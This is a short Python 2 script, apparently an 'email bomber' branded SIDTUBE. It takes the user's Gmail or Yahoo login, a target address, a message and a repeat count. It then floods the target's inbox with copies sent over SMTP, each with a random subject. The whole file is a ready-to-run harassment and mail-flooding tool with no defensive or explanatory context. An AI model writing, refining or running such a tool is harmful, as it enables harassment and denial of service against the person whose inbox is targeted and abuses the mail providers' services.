#!/usr/bin/python
# pip install pyfiglet

import smtplib
import getpass
import sys
import pyfiglet
import os


_banner = pyfiglet.figlet_format("SIDTUBE")
print(_banner)
server = raw_input ('Server Gmail/Yahoo: ')
user = raw_input('Your Email: ')
passwd = getpass.getpass('Password: ')


to = raw_input('\nTarget Email Address: ')
#subject = raw_input('Subject: ') 
body = raw_input('Message To Bomb: ')
total = input('Iterations: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print ' only for gmail  yahoo.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rE-mails sEnt: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n**** ALL Done *****'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!]  username or password is incorrect.'
    sys.exit()
